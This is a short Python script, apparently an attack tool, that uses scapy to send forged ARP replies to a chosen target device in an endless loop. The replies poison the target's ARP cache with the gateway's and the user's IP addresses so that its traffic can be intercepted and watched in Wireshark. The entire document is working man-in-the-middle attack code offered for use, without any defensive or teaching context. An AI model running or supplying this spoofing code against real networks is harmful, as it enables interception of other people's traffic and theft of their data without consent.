from scapy.all import ARP, send
import time

# Take inputs for IP addresses and MAC addresses
my_laptop_ip = input("Enter your laptop's IP address: ")
target_laptop_ip = input("Enter Target device's IP address: ")
gateway_ip = input("Enter your router/gateway IP address: ")

# Attacker's MAC (your system)
attacker_mac = input("Enter your MAC address: ")

def arp_spoof(target_ip, spoof_ip):
    # Construct the ARP packet
    arp_response = ARP(op=2, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff", psrc=spoof_ip)
    
    # Send the ARP packet
    send(arp_response, verbose=False)
    print(f"Sent spoofed ARP response, track network with wireshark")

try:
    print("Starting ARP spoofing...")
    while True:
        arp_spoof(target_laptop_ip, my_laptop_ip)
        arp_spoof(target_laptop_ip, gateway_ip)

        # Delay for a short time before resending packets
        time.sleep(2)
except KeyboardInterrupt:
    print("ARP spoofing stopped.")
